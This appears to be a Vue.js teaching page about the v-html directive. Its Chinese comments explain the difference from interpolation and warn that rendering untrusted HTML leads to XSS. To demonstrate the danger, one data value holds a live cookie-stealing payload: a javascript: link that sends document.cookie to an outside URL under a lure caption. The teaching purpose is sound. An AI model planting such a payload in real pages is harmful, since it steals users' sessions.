<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="./js/vue.js"></script>
</head>
<body>
    <!--
        v-html指令：
            1、作用：向指定节点中渲染包含html结构的内容
            2、与插值语法的区别：
                （1）v-html会替换掉节点中的内容，{{xxx}}不会
                （2）v-html可以识别html结构
            3、严重注意：v-html有安全性问题
                （1）在网站上动态渲染任意html是非常危险的，容易导致XSS攻击
                    XSS攻击可以理解为拿着你的cookie，冒充你的身份
                （2）一定要在可信的内容上使用v-html，不要用在用户提交的内容上！！
    -->
    <div id="root">
        <h3>你好,{{name}}</h3>
        <h3 v-html="name">你好</h3><!--v-text会覆盖标签里的文本内容-->
        <h3 v-html="str"></h3><!--会解析标签-->
        <h3 v-html="str2"></h3>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'cjx',
                str: '<a>666</a>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>你要的资源我拿到了，快来！</a>'
            }
        })
    </script>
</body>
</html>
